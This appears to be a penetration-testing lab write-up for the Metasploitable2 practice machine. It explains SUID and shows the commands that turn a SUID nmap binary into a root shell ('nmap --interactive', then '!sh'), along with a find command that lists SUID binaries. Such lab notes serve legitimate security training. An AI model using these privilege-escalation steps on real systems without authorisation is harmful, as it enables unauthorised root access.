# Metasploitable2 -- SUID Nmap Privilege Escalation

## Type
Local Privilege Escalation (LPE)

## Starting position
- Shell as: daemon
- Entry point: distccd exploit on port 3632

## What is SUID?
SUID (Set User ID) makes a program run with the owner's privileges
instead of the caller's. If a root-owned binary has SUID set,
anyone who runs it gets root-level execution for that process.

## Discovery
Metasploit's local_exploit_suggester identified /usr/bin/nmap as SUID.
Manual check:
```bash
ls -la /usr/bin/nmap
# -rwsr-xr-x  root  root  /usr/bin/nmap
```
The 's' in the permissions means SUID is set.

## Exploitation
Old nmap versions have an interactive mode that spawns a shell.
That shell inherits nmap's root privileges via SUID.
```bash
/usr/bin/nmap --interactive
nmap> !sh
whoami  # root
```

## Takeaway
Always check for SUID binaries after getting initial access.
Reference: gtfobins.github.io -- catalogs every abusable Unix binary.
Quick check command:
```bash
find / -perm -u=s -type f 2>/dev/null
```
